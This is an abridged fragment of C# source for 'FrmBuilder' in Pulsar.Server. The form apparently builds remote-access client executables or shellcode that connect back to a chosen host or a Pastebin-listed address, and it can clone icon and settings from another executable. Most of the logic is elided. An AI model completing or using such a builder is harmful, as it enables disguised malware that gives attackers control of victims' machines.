...
namespace Pulsar.Server.Forms
{
    public partial class FrmBuilder : Form
    {
        ...
        public FrmBuilder()
        {
            ...
            lblPortNotification.Text = "已自动设置端口!";
        ...
        private BuildOptions GetBuildOptions(bool isShellcode = false)
        {
            ...
            if (checkBox1.Checked)
            {
                ...
                {
                    throw new Exception("请输入有效的 Pastebin URL，应以 http:// 或 https:// 开头");
                }
            }
            else
            {
                ...
                {
                    throw new Exception("请输入有效的主机地址以供连接。");
                }
            }
            ...
            {
                throw new Exception("找不到 \"client.bin\" 文件，它应与 Pulsar 在同一目录下。");
            }
                    ...
                    try
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            MessageBox.Show(this,
                                $"客户端构建成功! 已保存至:\\{options.OutputPath}",
        ...
        private void BuildShellcode(object o)
        {
            try
            {
                ...
                try
                {
                    ...
                    {
                        MessageBox.Show(this,
                            $"客户端 Shellcode 构建成功! 已保存至:\\{options.OutputPath}",
                            "构建成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    });
                }
                catch (Exception)
            ...
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ...
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        ...
                        {
                            MessageBox.Show($"无法提取图标: {ex.Message}", "图标提取错误",
                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }

                        MessageBox.Show($"已成功从 {Path.GetFileName(ofd.FileName)} 克隆设置",
                            "克隆完成", MessageBoxButtons.OK, MessageBoxIcon.Information);

                        HasChanged();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"克隆设置时出错: {ex.Message}", "克隆失败",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
